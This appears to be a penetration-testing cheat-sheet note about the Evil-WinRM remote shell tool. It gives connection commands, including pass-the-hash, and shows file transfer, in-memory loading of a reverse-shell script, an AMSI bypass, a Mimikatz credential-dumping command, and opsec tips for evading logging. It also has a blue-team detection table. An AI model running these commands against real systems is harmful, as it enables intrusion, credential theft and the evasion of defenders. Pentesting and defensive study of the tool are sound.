---
title: Evil-WinRM
tags: |-
  - tool
  - evil-winrm
  - WinRM
  - lateral-movement
  - post-exploitation
  - windows
  - intermediate
category: exploitation
platform: Linux
install: gem install evil-winrm
created: 2026-03-26
updated: 2026-03-26
difficulty: intermediate
---

# 💀 Evil-WinRM

## What It Is
Evil-WinRM is a fully-featured WinRM (Windows Remote Management) shell for pentesting. It provides an interactive PowerShell session to Windows hosts over WinRM, with features for file upload/download, pass-the-hash, Kerberos auth, and in-memory script loading.

**WinRM ports:**
- HTTP: TCP 5985
- HTTPS: TCP 5986

## Installation
```bash
# Install (requires Ruby gems)
gem install evil-winrm

# Kali Linux
sudo apt install evil-winrm

# Verify
evil-winrm --help
```

---

## Basic Syntax
```bash
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD [options]
```

---

## Connection Methods

### Password Authentication
```bash
evil-winrm -i TARGET_IP -u administrator -p 'Password123!'
evil-winrm -i TARGET_IP -u DOMAIN\\user -p 'Password123!'
```

### Pass-the-Hash (NTLM)
```bash
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH
# NTLM hash format: 32-char hex (no LM hash needed — just NT hash)
# e.g., -H aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
# (can omit LM portion: -H 32ed87bdb5fdc5e9cba88547376818d4)
```

### HTTPS (Port 5986)
```bash
# With SSL certificate
evil-winrm -i TARGET_IP -u administrator -p 'Password123!' -S

# With custom certificate/key
evil-winrm -i TARGET_IP -u administrator -p 'Password123!' -S -c cert.pem -k key.pem
```

### Kerberos Authentication
```bash
# Requires krb5 libraries and valid TGT in KRB5CCNAME
export KRB5CCNAME=/path/to/ticket.ccache
evil-winrm -i TARGET_HOSTNAME -r DOMAIN.LOCAL
# Must use hostname, not IP, for Kerberos
```

---

## File Operations

```bash
# Upload a file from local to remote
*Evil-WinRM* PS> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Or simpler (uploads to current remote dir)
*Evil-WinRM* PS> upload /local/path/file.exe

# Download a file from remote to local
*Evil-WinRM* PS> download C:\Windows\Temp\sensitive.txt /local/save/location/

# Download to current local directory
*Evil-WinRM* PS> download C:\flag.txt
```

---

## In-Memory Script Loading

Load PowerShell scripts directly into memory without writing to disk:

```bash
# Specify local script directory at connection time
evil-winrm -i TARGET_IP -u admin -p pass -s /path/to/scripts/

# Inside session — load a script into memory
*Evil-WinRM* PS> Invoke-PowerShellTcpOneLine.ps1

# Scripts are loaded via menu() command
*Evil-WinRM* PS> menu
# Shows loaded scripts and built-in commands
```

---

## Useful In-Session Commands

```powershell
# Once connected — standard PowerShell + extras

# Check who you are
whoami
whoami /groups
whoami /priv

# Discover the host
hostname
ipconfig /all
net user
net localgroup administrators

# Check PowerShell version
$PSVersionTable

# List running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Find interesting files
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*.txt" -or $_.Name -like "*.kdbx"}

# Check scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}

# Bypass AMSI (if needed — often built into evil-winrm)
# evil-winrm has built-in AMSI bypass via menu > Bypass-4MSI
*Evil-WinRM* PS> menu
*Evil-WinRM* PS> Bypass-4MSI

# Invoke Mimikatz from memory (if you have scripts loaded)
*Evil-WinRM* PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

---

## WinRM Enablement (for setup / blue team knowledge)

```powershell
# Enable WinRM on target (requires local admin, run from target)
Enable-PSRemoting -Force
winrm quickconfig -y

# Allow specific hosts (firewall rule)
winrm set winrm/config/client '@{TrustedHosts="*"}'
# (Use specific IPs in production, not wildcard)

# Test connectivity
Test-WSMan -ComputerName TARGET_IP
```

---

## Detecting Evil-WinRM (Blue Team)

| Detection | Method |
|---|---|
| Event ID 4624 (LogonType=3) | Network logon via WinRM |
| Event ID 4656/4663 | Object access during file operations |
| PowerShell Script Block Logging (4104) | Commands executed in session |
| WinRM traffic on 5985/5986 | Firewall/NDR detection |
| AMSI bypass patterns | EDR/AMSI telemetry |

---

## Opsec Notes
> ⚠️ WinRM sessions generate Windows event logs. PowerShell logging (if enabled) records all commands. AMSI will catch malicious PowerShell unless bypassed.
- Use HTTPS (port 5986) to encrypt traffic from NDR
- Use `-s` to load scripts in-memory vs. disk writes
- Check if PowerShell logging is enabled before running sensitive commands
- Avoid enabling WinRM on systems where it wasn't enabled — creates noise

---

## Related Notes
- Impacket
- CrackMapExec
- Active-Directory
- AD-Attack-Reference
- Windows-Commands
- PowerShell-Security

## References
- Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm
- WinRM Protocol: https://docs.microsoft.com/en-us/windows/win32/winrm/

---
<- [[Tools-MOC]]